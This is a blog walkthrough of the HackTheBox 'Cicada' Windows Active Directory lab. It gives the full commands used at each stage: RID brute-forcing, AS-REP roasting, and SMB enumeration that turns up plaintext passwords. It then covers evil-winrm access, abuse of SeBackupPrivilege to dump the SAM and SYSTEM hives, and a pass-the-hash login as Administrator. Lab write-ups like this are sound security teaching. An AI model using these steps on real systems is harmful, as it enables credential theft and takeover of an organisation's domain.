---
title: "HackTheBox: Cicada"
date: 2025-02-16T09:00:00+02:00
draft: false
author: "Anthony Tuff"
cover:
image: /img/manager.png   ins
# alt: 'This is an alt tag for You Are Here picture'
# caption: 'This is a caption for the image. You are not lost.'
tags: ["Cicada-hackthebox","windows","hackthebox-walktrough","htb","privilege escacation"]
categories: ["hackthebox","windows","boot2root","tech"]
---

![You Are Here Sign](/img/manager.png)


# Machine Overview

## 🔍 Information Gathering Phase
As usual, I started with information gathering to detect open ports and identify services running on the target server. I ran an Nmap scan to probe the system for vulnerabilities and service banners.
Based on the results of the Nmap , I noted the below key observations from Nmap:


###### Scanning through Nmap
- **53 (DNS):** Might be a domain controller. A prime target for domain enumeration.
- **88 (Kerberos):** Active Directory? Kerberos authentication service is active. This confirms the presence of Active Directory and potential ticket or AD related attacks.
- **135/445 (SMB):** File shares? We can dig out to see if there are any shares for any sensitive files or credentials.
- **389/636 (LDAP/LDAPS):** User/group hunting grounds.
- **5985 (WinRM):**  WinRM is enabled, opening up the possibility of remote command execution. if we have a valid username we can see if we can get a shell access.

```bash
masscan -e tun0 -p1-65535 10.10.11.35 --rate=1000
nmap -sV  -A  -sC --min-rate=1000s 10.10.11.35
```

Based on the results of the Nmap the below table maps out "Possible Attack Vectors" for gaining access to the machine.

| _Port_ | _Service_      | _Description_                                                                                             | _Possible Attack Vectors_                                                                            |
| ------ | -------------- | --------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------- |
| _53_   | _domain_       | _DNS Service (Simple DNS Plus) – Likely used for resolving domain names in Active Directory (AD)._        | _DNS Poisoning, Subdomain Enumeration, Cache Snooping_                                               |
| _88_   | _kerberos-sec_ | _Kerberos authentication service – Indicates Active Directory environment._                               | _Kerberoasting, AS-REP Roasting, Ticket Forgery_                                                     |
| _135_  | _msrpc_        | _Microsoft RPC – Used for Remote Procedure Calls (DCOM services)._                                        | _DCOM Exploitation, Privilege Escalation, Lateral Movement_                                          |
| _139_  | _netbios-ssn_  | _NetBIOS Session Service – Used for SMB (file sharing) and older Windows networking protocols._           | _NetBIOS Spoofing, SMB Relay, Credential Harvesting_                                                 |
| _389_  | _ldap_         | _LDAP – Used for querying directory services in Active Directory._                                        | _LDAP Injection, Unauthorized Directory Enumeration, User/Group Information Disclosure_              |
| _445_  | _microsoft-ds_ | _SMB (Server Message Block) – File and printer sharing, often targeted for exploits (e.g., EternalBlue)._ | _EternalBlue Exploit, SMB Relay Attacks, Lateral Movement_                                           |
| _464_  | _kpasswd5_     | _Kerberos Password Change Service – Allows changing passwords in AD._                                     | _Password Harvesting, Replay Attacks, Exploiting Weak Password Policies_                             |
| _593_  | _ncacn_http_   | _RPC over HTTP – Allows RPC calls to traverse HTTP (used in distributed environments)._                   | _Man-in-the-Middle (MITM) Attacks, Exploiting Misconfigured RPC Services, Credential Interception_   |
| _636_  | _ldaps_        | _Secure LDAP (over SSL/TLS) – Encrypted LDAP communication._                                              | _Exploiting Weak SSL Configurations, LDAPS Injection, Misconfigured Authentication_                  |
| _3268_ | _ldap_         | _Global Catalog Service (non-secure) – LDAP queries across multiple domains._                             | _Unauthorized Enumeration of Domains, Credential Harvesting, LDAP Injection_                         |
| _3269_ | _ldaps_        | _Secure Global Catalog Service – Secure LDAP queries across multiple domains._                            | _Exploiting Weak Encryption, Misconfigured Secure Communication, Unauthorized Directory Enumeration_ |



###### RID Brute-Forcing – Sniffing Out Domain User
Based on the results from Nmap’s  I decided to perform RID Brute-forcing using crackmapexec, aiming to enumerate user accounts on the Domain Controller (DC). This technique abuses the Relative Identifier (RID) sequencing, allowing us to query Security Identifiers (SIDs) and resolve them into usernames—often without authentication.<br> The results are as follows:<br>

```
crackmapexec smb 10.10.11.35  -u 'guest'  -p '' --rid-brute | tee domainusersv1.txt
```

![](/img/Pasted%20image%2020241231095940.png)


Hulla! We bagged a list of potential usernames. With this information , we can attempt AS-REP Roasting attack. This attack checks for accounts with pre-authentication disabled, letting us snag their hashed credentials for offline cracking.

**AS-REP Roasting Attempts as shown below**- (Nothing Found)
```
impacket-GetNPUsers cicada.htb/ -dc-ip 10.10.11.35 -usersfile domainusers.txt -no-pass -outputfile asrep_hashes.txt
```

![](/img/Pasted%20image%2020241231131133.png)

Even though this attempt didn’t yield a direct credential dump, the username list remains a valuable foothold for further att;acks. Next, We can explore another vector such enumerating services to identify potential misconfigurations. In my case we can check SMB;


## Enumeration
###### SMB Enumeration
Since port 445 (SMB) was open, we can check to see if there are any accessible SMB shares. In our cases the box had unahtenticated access which means of guest permissions are enabled we can be able to enumerate the shares in the drive.

Using SMB Client, I identified several interesting shares, as follows:
- **ADMIN$**: Remote Admin share (usually for administrative tasks).
- **C$**: Default administrative share for the C: drive.
- **DEV**: Custom share (possibly containing files).
- **HR**: Custom share (could be sensitive—requires exploration).
- **IPC$**: Used for inter-process communication. 
- **NETLOGON**: Scripts for logging in domain accounts.
- **SYSVOL**: Policies and scripts for domain controllers

![](/img/Pasted%20image%2020241230225850.png)

What pooped out from the shares was  intereseting shares that seemed uniques:

```
- DEV: Custom share (possibly containing files).
- HR: Custom share (Contains a file named Notice from HR.txt).
```
###### 📂 Extracting Credentials from HR Share
After accessing the HR Share, I found a file named **Notice from HR.txt**. Upon reviewing its contents, I discovered a message left for what seemed to be for a new hire which contained a password. 
Sounds like a promising lead,with this in hand, we can see if we can gain access initial foothold on the box or do authenticated scans on the SMB shares.
Alternatively, Since we have a a list of valid usernames from our RID Brute-forcing, we can attempt to perform password spraying on the box to see if we can get a hit.

![](/img/Pasted%20image%2020241230230616.png)

```
Password: Cicada$M6Corpb*@Lp#nZp!8
```

From the password spray, I found that the user michael had a valid password match.With this we can perform authenticated scans,enabling deeper exploration of SMB shares,AD, and other network resources.
I alsoe attempted to evil-WinRM to the box, but in my case it didn't work out, may the domain user cannot authenticate to the host.The next logical steps I attempted was to enumerate the AD through the credetials

Leveraging the credentials,we can perform a quick users enumeration just to see if we can be able to enumerate AD objects, and by keenly observing the results I spotted a verbose description for the user david  that had a pasword.
description. 

```
cicada.htb\david.orelious
aRt$Lp#7t*VQ!3
```

![](/img/Pasted%20image%2020241231103313.png)

🎭 VAPT Intel: This is a classic misconfiguration I’ve encountered frequently in internal penetration tests. It’s common for system administrators to store credentials in user descriptions, especially when creating temporary or service accounts for easy reference.  Can be a low hanging fruit
It's comes out handy in AD_Style engagements,some good starting point. 

Putting that aside, With David credentials, I attempted authenticated SMB enumeration to see what additional resources were accessible. I executed the below commands:

```
smbclient //10.10.11.35/DEV -U michael.wrighton
```
![](/img/Pasted%20image%2020241231114657.png)

I successfully accessed the DEV share and we are presented with a Backup_Script. Upon reviewing the script,there are hardcoded credentials belonging for the user emily.osacalrs.

```
emilyoscars
Q!3@Lp#M6b*7t*Vt
```

![](/img/Pasted%20image%2020241231114849.png)

### Intial FootHold
Armed with Emily’s credentials, we can test for  WinRM authentication again—and this time, we have a shell on the taget server.
```
evil-winrm -i 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```
From here we can grab our User Flag.
![](/img/Pasted%20image%2020241231115131.png)

![](/img/Pasted%20image%2020250105163258.png)

Weh, let's first grab some coffee, and then we can come and look into Privilege escalation stufff...

## Privilege Escalation
As for the privilege escacation,especially in an Active Directory (AD) environment, I always find it  has a steep learning curve due to the numerous potential attack vectors.
 My usual approach involves running BloodHound and WinPEAS to gather initial insights first and pottential areas that can be a guiding factor.

##### Random Checks
```
bloodhound-python -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' -d cicada.htb -ns 10.10.11.35 -c All -o data.zip
```

```
impacket-GetNPUsers cicada.htb/ -dc-ip 10.10.11.35 -usersfile domainusers.txt -no-pass -outputfile asrep_hash.txt
```

![](/img/Pasted%20image%2020241231104652.png)


📊 Situational Awareness
To understand where we stand in terms of privileges, I first ran:
```
whoami /all
whoami /priv
```
![](/img/Pasted%20image%2020250105163258.png)


This command lists the privileges assigned to the current user.If high-privilege rights for instance SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege are enabled, 
they could be leveraged for privilege escalation techniques like **Juicy Potato** or **Token Impersonation**.

![](/img/Pasted%20image%2020250105163258.png)

Based on the results, we see the box allowes the users to do some backup,writable changes, memory modofications  but what does this mean in terms of privilege escalation and potential escalation stufff.let's demistify furthr
Here’s your content in table format:

| **Privilege**                              | **Description**                                                                                                                                                                                                                                                     |
| ------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **SeBackupPrivilege & SeRestorePrivilege** | Allow a user to back up and restore files, potentially granting access to protected files, including sensitive system configurations and credentials. Could be used to read the SAM, SYSTEM, and SECURITY hives, which may contain hashed passwords of other users. |
| **SeShutdownPrivilege**                    | Allows a user to force system reboots. While not directly exploitable for privilege escalation, it can disrupt operations or facilitate persistence techniques.                                                                                                     |
| **SeChangeNotifyPrivilege**                | Enables file traversal even when explicit directory permissions are denied, potentially allowing access to restricted locations.                                                                                                                                    |
| **SeIncreaseWorkingSetPrivilege**          | Used for modifying the memory limits of processes. Not commonly leveraged for privilege escalation.                                                                                                                                                                 |

From alot of googling, numerous trial-and-error, rabit holes and chatgpt for the win,I saw this blog post(https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html)  that seemed to have promising escalation route.

Exploitation Steps
Since  ‘SeBackupPrivilege’ is Enabled for our user ‘emily.oscars’: It means we can be able to read any file on the system, we can leverage it to extract critical files such as SAM and SYSTEM, which contain hashed passwords of local users, including the Administrator.

In a nutshell,you may ask what going on here; From my understanding we are actually abusing SeBackupPrivilege to extract sensitive system files(SAM FILES, SYSTEM). Normally, users can’t access every file on a Windows machine, but the SeBackupPrivilege setting lets a user read everything on the system (even things they normally wouldn’t have access to).

Saving SAM & SYSTEM files:
To avoid detection or AMSI blocks by Windows, I first moved to the Temp folder(Temp is also writeable) to somewhere we can access, then saved a copy of the SAM and SYSTEM files there using the following commands:

```
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```

![](/img/Pasted%20image%2020241231122509.png)


Windows stores password information in a special **SAM file**, but the passwords are scrambled (hashed) for security.
The **SYSTEM file** contains the secret keys needed to unscramble (decrypt) these passwords.

After saving the Files, we can downloaded the files to our attacker machine:
```
download c:\Temp\sam
download c:\Temp\system
```
![](/img/Pasted%20image%2020241231125333.png)


Once downloaded, We can use secretsdump from impacket to extract password hashes from the SAM & SYSTEM files.
```
impacket-secretsdump -sam sam -system system LOCAL
```

![](/img/Pasted%20image%2020241231125333.png)

From the results we now have an Administrator’s password hash, which we can evil-winrm to gain root access over the machine.

```
evil-winrm -i 10.10.11.35 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341
```
![](/img/Pasted%20image%2020241231130245.png)
Now, we are ROOT!



## 📜 Conclusion
